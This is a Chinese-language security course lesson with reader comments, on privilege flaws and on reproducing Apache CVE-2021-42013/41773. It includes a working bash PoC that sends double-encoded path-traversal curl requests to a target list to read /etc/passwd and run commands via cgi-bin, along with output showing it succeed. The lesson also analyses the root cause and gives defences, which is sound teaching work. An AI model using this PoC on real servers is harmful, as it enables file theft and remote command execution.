{"id":471890,"title":"04｜权限不合理：攻击者进来就是root权限？","content":"<p>你好，我是王昊天。</p><p>在多年的电脑使用经历中，你肯定经历过这种画面：</p><p>下载了官方软件却没有正版授权，于是千辛万苦找到一个破解软件，但是在运行破解软件时不断被杀毒软件拦截，一怒之下你把杀毒软件关闭了，随着破解软件的成功消息弹出，你露出了满意的微笑……</p><p>3天后你的电脑由于病毒感染无法开机了。</p><p>这是一种很典型的场景——为了某些临时性的操作破坏了权限边界，进而导致安全问题的发生。其实，<strong>除了临时性的操作，还有很多权限安全问题是长期性的</strong>，可能是配置原因、也可能是代码原因，接下来就让我们来一起探究。</p><h2>权限不合理</h2><p><strong>权限不合理简单来说，是不合理的权限赋予、权限处理以及权限管理过程</strong>。这里所说的权限，指的是终端角色的一种属性。那么什么是终端角色呢？你可以理解为，用户就是一个终端角色。</p><p>与权限相关的赋予、处理以及管理过程，我们主要通过权限管理来统一实现。权限管理就是能够赋予终端执行某种特殊操作的权利，比如在某些运维场景下，运维人员能够获得系统维护的权限，这其中就包括重启服务器权限——我们都知道服务器重启可不是常规操作权限。</p><p><strong>接下来我们以运行时权限过高为例，来看几种典型的攻击场景。</strong></p><p>应用软件在执行某些操作时可能会获取过高的权限，这就可能会破坏我们之前课程中提到的最小权限原则，如果因为这种原因导致了提权漏洞的发生，就可能会放大其他安全风险，导致严重后果。</p><!-- [[[read_end]]] --><p>随着应用软件执行权限的提高，比如运行在root或者Administrator权限，操作系统或者软件环境提供的安全检查可能会失效；更进一步，由于操作环境权限提升，已经存在的中低危安全风险可能因此升级为高危安全漏洞。</p><p><strong>1. 高权限运行应用</strong></p><p>在安装和运行组件的过程中，某些程序组件的运行环境设置的权限过高，导致低权限应用通过服务调用关系可以完成提权操作。</p><p>与开发层面相比，这一类问题的发生更多倾向于运维层面，比较典型的场景如：攻击者通过WebApp挖掘出注入类型的漏洞，而数据库运行在root或者Administrator权限，则可以通过注入提权的方式尝试远程命令执行。</p><p><strong>2. 降权时出现异常 </strong></p><p>以下代码尝试去创建一个用户文件夹，在此操作期间进行了短暂提权：</p><pre><code class=\"language-python\">def makeNewUserDir(username):\n    ...\n    try:\n        raisePrivileges()\n        os.mkdir('/home/' + username)\n        lowerPrivileges()\n    except OSError:\n        return False\n    ...\n</code></pre><p>上述代码包含了一次短暂提权，开发者在完成目标操作后立即进行了降权，但要注意的是username作为一个外部输入的参数，可能由于各种原因（输入不合法、安全过滤不严格等）导致mkdir函数报错进而抛出异常，一旦触发这种情况lowerPrivileges函数就无法得到执行，程序将持续以高权限状态运行，可能会为后续漏洞利用过程提供舒适的环境。</p><h2>案例实战</h2><h4>CVE-2021-42013 简介</h4><p>这是一个Apache服务器中存在的高危安全漏洞，会导致服务器路径遍历、关键文件泄露以及远程命令执行漏洞。</p><p>有趣的是，该漏洞是CVE-2021-41773的兄弟漏洞，CVE-2021-41773影响的软件版本是2.4.49，该软件版本在2021-09-15发布，在修复了CVE-2021-41773漏洞后，开发团队于2021-10-04发布了2.4.50版本，但是在新版本发布的次日，安全研究人员就发现对CVE-2021-41773漏洞的修复并不完善，会导致一个变种漏洞的发生——CVE-2021-42013。经过apache确认问题后，再次发布了2.4.51版本。</p><p>关于apache服务器历史源码的下载，可以在apache官网找到链接：<a href=\"https://archive.apache.org/dist/httpd/\">Index of /dist/httpd</a></p><h4>CVE-2021-42013 漏洞复现</h4><p>这里我们提供了两种实验方案：你可以从源码编译安装，也可以直接使用MiTuan搭建好的环境。</p><p><strong>我们先来看看第一种方案，如何通过源码编译安装httpd。</strong></p><p>我们首先访问apache官网，选择2.4.50版本下载：</p><p><a href=\"https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz\">https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz</a></p><p>通过Docker或者虚拟机启动一台Ubuntu Server，如下是httpd编译安装前的环境依赖：</p><pre><code class=\"language-bash\">apt install libapr1 libapr1-dev\napt install libaprutil1 libaprutil1-dev\napt install libpcre3 libpcre3-dev\n</code></pre><p>然后编译安装即可：</p><pre><code class=\"language-bash\"># Extract\ntar -xvf httpd-2.4.50.tar.gz\ncd httpd-2.4.50\n# Configure\n./configure\n# Compile\nmake\n# Install\nmake install\n# Test\n/usr/local/apache/bin/apachectl -k start\n</code></pre><p>这里要注意在完全默认配置下该漏洞是不存在的，这里我们需要对配置文件做简单的修改：</p><pre><code class=\"language-plain\"># 1.\n&lt;Directory /&gt;\n    Require all granted\n&lt;/Directory&gt;\n# 2.\nLoadModule cgid_module modules/mod_cgid.so\n</code></pre><p>上述的代码主要做了两处修改。一是许可了Apache服务器对文件系统的访问操作，二是加载了一个Module。</p><p>要知道，在部署WebApp的过程中这两处修改是非常普遍的，因此该漏洞的影响范围非常大。</p><p>通过netstat -antp命令可以查看服务状态：</p><pre><code class=\"language-bash\">root@1dd54d1b3962:/home# netstat -antp\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      26722/httpd\n</code></pre><p><strong>我们来来看看第二种方案，尝试使用MiTuan直接启动环境。</strong></p><p>我已经构建好了标准的2.4.50版本httpd服务器环境，你可以访问<a href=\"http://mituan.zone\">MiTuan</a>，直接搜索[极客时间-漏洞挖掘与智能攻防实战]并选择[CVE-2021-42013]来进行测试。</p><p>PoC代码如下：</p><pre><code>#!/bin/bash\n\nif [[ $1 == '' ]]; [[ $2 == '' ]]; then\n  echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]\n  echo ./PoC.sh targets.txt /etc/passwd\n  echo ./PoC.sh targets.txt /bin/sh id\n  exit\nfi\n\nfor host in $(cat $1);\ndo\n  echo $host\n  if [[ $3 == '' ]]; then\n    curl -v --path-as-is &quot;$host/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2&quot;;\n    exit\n  fi\n  curl -s --path-as-is -d &quot;echo Content-Type: text/plain; echo; $3&quot; &quot;$host/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2&quot;;\ndone\n</code></pre><p>执行PoC代码：</p><pre><code class=\"language-bash\">root@1dd54d1b3962:/home# ./CVE-2021-42013.sh targets.txt /etc/passwd\n127.0.0.1\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...\n\nroot@1dd54d1b3962:/home# ./CVE-2021-42013.sh targets.txt /bin/sh id\nhttp://127.0.0.1\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\n</code></pre><p>可以看到我们可以通过该漏洞访问到<code>/etc/passwd</code>文件，并且执行命令获取当前环境的用户信息。</p><h4>CVE-2021-41773 漏洞分析</h4><p>在成功利用漏洞之后，接下来我们要探究一下漏洞的具体成因。考虑到CVE-2021-42013与CVE-2021-41773是兄弟漏洞，CVE-2021-42013是由于修复不完善导致的变形，所以这里我们从CVE-2021-41773分析入手。</p><p>CVE-2021-41773影响的是Apache HTTP Server 2.4.49版本，因此我们可以：从官网下载对应的源代码，使用常用的编辑器查看：<a href=\"https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz\">https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz</a>，或者通过MiTuan的CVE-2021-42013漏洞环境查看。MiTuan的漏洞环境中的<code>/home/httpd-2.4.49</code>包含了对应的源码，同时也内置了vim编辑器。</p><p>与本漏洞相关的核心代码位于<code>/home/httpd-2.4.49/server/util.c</code>文件，核心函数是<code>ap_normalize_path(char *path, unsigned int flags)</code>，漏洞相关代码如下：</p><pre><code class=\"language-c++\">|    while (path[l] != '\\0') {\n-        /* RFC-3986 section 2.3:\n2         *  For consistency, percent-encoded octets in the ranges of\n2         *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),\n2         *  period (%2E), underscore (%5F), or tilde (%7E) should [...]\n2         *  be decoded to their corresponding unreserved characters by\n2         *  URI normalizers.\n2         */\n2        // 老师添加的注释 - part1\n2        if ((flags &amp; AP_NORMALIZE_DECODE_UNRESERVED)\n-                &amp;&amp; path[l] == '%' &amp;&amp; apr_isxdigit(path[l + 1])\n-                                  &amp;&amp; apr_isxdigit(path[l + 2])) {\n3            const char c = x2c(&amp;path[l + 1]);\n3            if (apr_isalnum(c) || (c &amp;&amp; strchr(\"-._~\", c))) {\n-                /* Replace last char and fall through as the current\n4                 * read position */\n4                l += 2;\n4                path[l] = c;\n3            }\n2        }\n-           ...\n2        if (w == 0 || IS_SLASH(path[w - 1])) {\n-            /* Collapse ///// sequences to / */\n3            if ((flags &amp; AP_NORMALIZE_MERGE_SLASHES) &amp;&amp; IS_SLASH(path[l])) {\n-                do {\n-                    l++;\n4                } while (IS_SLASH(path[l]));\n4                continue;\n3            }\n3\n3            // 老师添加的注释 - part2\n3            if (path[l] == '.') {\n-                /* Remove /./ segments */\n4                if (IS_SLASH_OR_NUL(path[l + 1])) {\n-                    l++;\n5                    if (path[l]) {\n-                        l++;\n5                    }\n5                    continue;\n4                }\n4                /* Remove /xx/../ segments */\n4                if (path[l + 1] == '.' &amp;&amp; IS_SLASH_OR_NUL(path[l + 2])) {\n-                    /* Wind w back to remove the previous segment */\n5                    if (w &gt; 1) {\n-                        do {\n-                            w--;\n6                        } while (w &amp;&amp; !IS_SLASH(path[w - 1]));\n5                    }\n</code></pre><p>根据我在源码中添加的注释，可以定位关键代码段：</p><ul>\n<li>\n<p>注释1：<br>\n检测到路径中存在%字符时，如果紧跟的2个字符是十六进制字符，就会进行url解码，将其转换成标准字符。</p>\n<p>效果：<code>%2e -&gt; .</code></p>\n</li>\n<li>\n<p>注释2：<br>\n判断是否存在<code>../</code>  ，如果路径中存在<code>%2e./</code> 形式，就会检测到，但是出现<code>.%2e/</code> 这种形式时，就不会检测到。</p>\n<p>效果：使用<code>.%2e/</code>或者<code>%2e %2e</code> 绕过对路径穿越符的检测。</p>\n</li>\n</ul><p>由此，即可构建PoC代码：</p><pre><code> $host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/password\n</code></pre><p>好的，至此我们已经成功从代码中分析清楚CVE-2021-41773漏洞的成因，并且构建了能够利用漏洞的PoC代码。接下来我们要学习如何从安全建设和开发的角度来防御这种风险。</p><h2>防御及检测</h2><p>针对权限相关的安全问题，在三个不同的阶段，我们分别有不同的方式加以防御和检测。</p><p><strong>在架构设计阶段</strong>，你可以使用“最小权限原则”来运行你的代码，如果可能的话，为你的任务代码创建一个独立的、拥有受限权限的账户。在这种情况下，即使攻击者的完成了一次入侵，也很难直接威慑到软件系统的其他部分。举例来说，数据库应用很少以DBA的形式长时间运行。</p><p>另外，你需要识别出需要额外权限的函数，并做好“权限隔离”。**可以通过封装的方式，尽可能的将高权限需求函数与其他代码分割开，同时尽量晚地进行提权操作，以及尽量早地进行降权操作，防止外部任何可能干扰高权限代码段的输入发生。</p><p><strong>在开发实现阶段</strong>，你需要对于高权限代码段要给予足够的关注，在输入检测层面要提供更严格的审核以及限制策略。</p><p>当进行降权时，不要忘记额外调用检测函数以确保权限被成功降低，防止出现降权函数执行失败导致权限没有降低的情况。</p><p><strong>在系统配置阶段</strong>，对于复杂应用系统，你要确保配置文件得到良好的审计，配置文件往往会大幅度影响应用系统的权限级别。</p><h2>总结</h2><p>这节课我们学习了一种很常见但是很重要的安全风险——权限相关的漏洞。</p><p>这种漏洞有时与运维相关，由高权限运行应用导致；有时与开发代码相关，由开发时降权失败导致，对此我们分别列举了典型的攻击场景。</p><p>然后我们找到了一个2021年发生高危漏洞——CVE-2021-42013，它是一个由于配置不当引发的权限相关的漏洞，成功利用可以导致文件越权访问以及远程代码执行。</p><p>通过搭建环境并进行PoC代码编写，我们成功完成了漏洞的复现，掌握了CVE-2021-42013的使用。</p><p>但是会使用一个漏洞只是量的积累，我们更希望以点及面，从这个漏洞入手进而掌握这一类漏洞的原理。为了分析漏洞原理，我们追踪了它的兄弟漏洞——CVE-2021-41773，这是CVE-2021-42013漏洞的前一版本，正是由于开发人员更新时针对CVE-2021-41773的修复不完整，才导致了CVE-2021-42013的发生。</p><p>接下来我们又从源码层面挖掘漏洞的根源。</p><p>你需要判断是否存在<code>../</code>，如果路径中存在<code>%2e./</code>形式，就会检测到，但是出现<code>.%2e/</code>这种形式时 ，就不会检测到。这一漏洞是由于输入检测不严格，导致用户能够进行输入绕过，完成命令执行。</p><p>从本质上来看，问题发生的根源是过滤不严格导致的安全漏洞，关于输入过滤的问题我们已经在前几节课中探讨过，这节课我们更多的是关注存在问题时，我们应该如何做安全建设：</p><ol>\n<li>通过函数封装、用户隔离等方式最小权限运行代码；</li>\n<li>对高权限代码给予额外的输入检测以及函数检查；</li>\n<li>对复杂应用系统的配置文件进行安全审计。</li>\n</ol><p>通过结合前几节课程中提到的输入过滤等安全策略，这种多维度、多层次的安全建设，可以更有效地提高应用系统的整体安全性。</p><h2>思考题</h2><p>这节课我们研究了CVE-2021-41773 漏洞，你可以继续完成CVE-2021-42013 漏洞的分析吗？</p><p>欢迎在评论区留下你的思考，我们下节课再见。</p>","neighbors":{"left":{"article_title":"03 | 敏感数据泄露：攻击者如何获取用户账户？","id":470741},"right":{"article_title":"05｜CSRF：为什么用户的操作他自己不承认？","id":472487}},"comments":[{"had_liked":false,"id":359103,"user_name":"南瓜不胡闹","can_delete":false,"product_type":"c1","uid":1225669,"ip_address":"上海","ucode":"5E5AF11DF97180","user_header":"https://static001.geekbang.org/account/avatar/00/12/b3/c5/38439724.jpg","comment_is_top":false,"comment_ctime":1665241510,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1665241510","product_id":100101501,"comment_content":"42013验证成功，在mituan上的那个靶场有flag可以获取提交么","like_count":0},{"had_liked":false,"id":359085,"user_name":"南瓜不胡闹","can_delete":false,"product_type":"c1","uid":1225669,"ip_address":"上海","ucode":"5E5AF11DF97180","user_header":"https://static001.geekbang.org/account/avatar/00/12/b3/c5/38439724.jpg","comment_is_top":false,"comment_ctime":1665226435,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1665226435","product_id":100101501,"comment_content":"测试为什么返回的是408报错呢<br><br>HTTP&#47;1.1 408 Request Timeout<br>Date: Sat, 08 Oct 2022 10:49:48 GMT<br>Server: Apache&#47;2.4.50 (Unix)<br>Content-Length: 221<br>Connection: close<br>Content-Type: text&#47;html; charset=iso-8859-1<br><br>&lt;!DOCTYPE HTML PUBLIC &quot;-&#47;&#47;IETF&#47;&#47;DTD HTML 2.0&#47;&#47;EN&quot;&gt;<br>&lt;html&gt;&lt;head&gt;<br>&lt;title&gt;408 Request Timeout&lt;&#47;title&gt;<br>&lt;&#47;head&gt;&lt;body&gt;<br>&lt;h1&gt;Request Timeout&lt;&#47;h1&gt;<br>&lt;p&gt;Server timeout waiting for the HTTP request from the client.&lt;&#47;p&gt;<br>&lt;&#47;body&gt;&lt;&#47;html&gt;","like_count":0},{"had_liked":false,"id":327904,"user_name":"DoHer4S","can_delete":false,"product_type":"c1","uid":2391667,"ip_address":"","ucode":"A1D028355FAEB8","user_header":"https://static001.geekbang.org/account/avatar/00/24/7e/73/a5d76036.jpg","comment_is_top":false,"comment_ctime":1640351626,"is_pvip":true,"replies":[{"id":"119669","content":"文中的代码稍稍有点小问题，我已经修复好啦，快去MiTuan中搜索[极客时间-漏洞挖掘与智能攻防实战]并选择[CVE-2021-42013]，攻击这个诱人的漏洞吧！ヾ(◍°∇°◍)ﾉﾞ","user_name":"作者回复","user_name_real":"编辑","uid":"1989426","ctime":1640774623,"ip_address":"","comment_id":327904,"utype":1}],"discussion_count":2,"race_medal":0,"score":"1640351626","product_id":100101501,"comment_content":"老师您好，在MiTuan中执行您上边的代码，返回 400 Bad Request 错误；<br>尝试在 URL 中访问路径 `&#47;cgi-bin` 返回404；<br>请问是哪里出问题呢？","like_count":0,"discussions":[{"author":{"id":1989426,"avatar":"https://static001.geekbang.org/account/avatar/00/1e/5b/32/d0fbee97.jpg","nickname":"王昊天","note":"","ucode":"A13BBE0E61BC61","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":542524,"discussion_content":"文中的代码稍稍有点小问题，我已经修复好啦，快去MiTuan中搜索[极客时间-漏洞挖掘与智能攻防实战]并选择[CVE-2021-42013]，攻击这个诱人的漏洞吧！ヾ(◍°∇°◍)ﾉﾞ","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1640774623,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":2391667,"avatar":"https://static001.geekbang.org/account/avatar/00/24/7e/73/a5d76036.jpg","nickname":"DoHer4S","note":"","ucode":"A1D028355FAEB8","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":541617,"discussion_content":"我使用Docker运行环境成功复现了该漏洞，POC代码脚本是没有问题的，怀疑是MiTuan上的openresty自身就集成了Web防护功能，可能是这个问题导致400 Bad Rrequest；\n\nGithub： https://github.com/ahmad4fifz/CVE-2021-42013\n\n使用 Docker 来重现这个漏洞，检测是有效的。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1640486159,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":327903,"user_name":"空间探索","can_delete":false,"product_type":"c1","uid":1046296,"ip_address":"","ucode":"C20534FCAB311E","user_header":"https://static001.geekbang.org/account/avatar/00/0f/f7/18/e6367c6f.jpg","comment_is_top":false,"comment_ctime":1640351616,"is_pvip":true,"replies":[{"id":"119670","content":"是的是的，跪下认错，o(T-T)ゞ<br>不过我已经更新啦，MiTuan中搜索[极客时间-漏洞挖掘与智能攻防实战]并选择[CVE-2021-42013]，快去攻击这个诱人的小漏洞吧！ヾ(◍°∇°◍)ﾉﾞ","user_name":"作者回复","user_name_real":"编辑","uid":"1989426","ctime":1640774674,"ip_address":"","comment_id":327903,"utype":1}],"discussion_count":2,"race_medal":0,"score":"1640351616","product_id":100101501,"comment_content":"MiTuan 上对应这个CVE 的靶机 返回的信息是 <br>&lt;html&gt;<br>&lt;head&gt;&lt;title&gt;400 Bad Request&lt;&#47;title&gt;&lt;&#47;head&gt;<br>&lt;body&gt;<br>&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;&#47;h1&gt;&lt;&#47;center&gt;<br>&lt;hr&gt;&lt;center&gt;openresty&#47;1.17.8.2&lt;&#47;center&gt;<br>&lt;&#47;body&gt;<br>&lt;&#47;html&gt;<br><br>感觉靶机不对吧","like_count":0,"discussions":[{"author":{"id":1989426,"avatar":"https://static001.geekbang.org/account/avatar/00/1e/5b/32/d0fbee97.jpg","nickname":"王昊天","note":"","ucode":"A13BBE0E61BC61","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":542525,"discussion_content":"是的是的，跪下认错，o(T-T)ゞ\n不过我已经更新啦，MiTuan中搜索[极客时间-漏洞挖掘与智能攻防实战]并选择[CVE-2021-42013]，快去攻击这个诱人的小漏洞吧！ヾ(◍°∇°◍)ﾉﾞ","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1640774674,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1021923,"avatar":"https://static001.geekbang.org/account/avatar/00/0f/97/e3/806f5f05.jpg","nickname":"M","note":"","ucode":"6BFEC7C01EDF3E","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":559572,"discussion_content":"还是404","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1648820202,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":327884,"user_name":"波动星球","can_delete":false,"product_type":"c1","uid":1546983,"ip_address":"","ucode":"455E7E12A312A1","user_header":"https://static001.geekbang.org/account/avatar/00/17/9a/e7/310b4a12.jpg","comment_is_top":false,"comment_ctime":1640338416,"is_pvip":false,"replies":[{"id":"119668","content":"文章内容有点小错误，已经修改好啦，MiTuan中搜索[极客时间-漏洞挖掘与智能攻防实战]并选择[CVE-2021-42013]就可以啦，快去攻击它吧！ღ( ´･ᴗ･` )比心","user_name":"作者回复","user_name_real":"编辑","uid":"1989426","ctime":1640774568,"ip_address":"","comment_id":327884,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1640338416","product_id":100101501,"comment_content":"CVE-2021-42013 Mituan中 搜不到 ","like_count":0,"discussions":[{"author":{"id":1989426,"avatar":"https://static001.geekbang.org/account/avatar/00/1e/5b/32/d0fbee97.jpg","nickname":"王昊天","note":"","ucode":"A13BBE0E61BC61","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":542523,"discussion_content":"文章内容有点小错误，已经修改好啦，MiTuan中搜索[极客时间-漏洞挖掘与智能攻防实战]并选择[CVE-2021-42013]就可以啦，快去攻击它吧！ღ( ´･ᴗ･` )比心","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1640774568,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":327774,"user_name":"peter","can_delete":false,"product_type":"c1","uid":1058183,"ip_address":"","ucode":"261C3FC001DE2D","user_header":"https://static001.geekbang.org/account/avatar/00/10/25/87/f3a69d1b.jpg","comment_is_top":false,"comment_ctime":1640302165,"is_pvip":true,"replies":[{"id":"119519","content":"正有此意！懂我，握爪ヽ(*^ｰ^)人(^ｰ^*)ノ！","user_name":"作者回复","user_name_real":"编辑","uid":"1989426","ctime":1640616928,"ip_address":"","comment_id":327774,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1640302165","product_id":100101501,"comment_content":"可以讲讲最近log4j的漏洞吗？为了不打乱课程计划，可以以加餐的形式来讲，","like_count":0,"discussions":[{"author":{"id":1989426,"avatar":"https://static001.geekbang.org/account/avatar/00/1e/5b/32/d0fbee97.jpg","nickname":"王昊天","note":"","ucode":"A13BBE0E61BC61","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":541984,"discussion_content":"正有此意！懂我，握爪ヽ(*^ｰ^)人(^ｰ^*)ノ！","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1640616928,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]}]}